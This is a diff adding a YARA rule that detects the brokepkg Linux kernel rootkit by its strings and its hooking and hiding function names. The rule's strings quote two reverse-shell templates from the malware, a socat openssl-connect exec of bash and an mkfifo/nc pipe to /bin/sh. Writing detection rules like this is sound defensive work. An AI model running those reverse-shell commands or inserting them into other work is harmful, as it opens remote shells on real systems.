@@ -49,6 +49,34 @@ rule Father_Gen1 {
     )
 }
 
+
+rule BrokePkg_Gen1 {
+  meta:
+    description = "Kernel module file of brokepkg"
+    github = "https://github.com/R3tr074/brokepkg"
+    md5 = "bb19d79bc2523ed663ea0c26f49b6425"
+  strings:
+    $ = "br0k3_n0w_h1dd3n" fullword ascii
+    $ = "fh_install_hook" fullword ascii
+    $ = "6brokepkg" fullword ascii
+    $ = "socat openssl-connect:%s:%s,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane" fullword ascii
+    $ = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" fullword ascii
+  condition:
+    elf_dyn and
+    (
+      for 3 i in (0 .. elf.dynsym_entries):
+      (
+        elf.dynsym[i].type == elf.STT_FUNC and
+        (
+          elf.dynsym[i].name == "fh_install_hooks" or
+          elf.dynsym[i].name == "port_hide" or
+          elf.dynsym[i].name == "hide_pid"
+        )
+      ) or
+      2 of them
+    )
+}
+
 rule Symbiote_a0d1 {
   meta:
     description = "ELF EXE file of 5 samples"
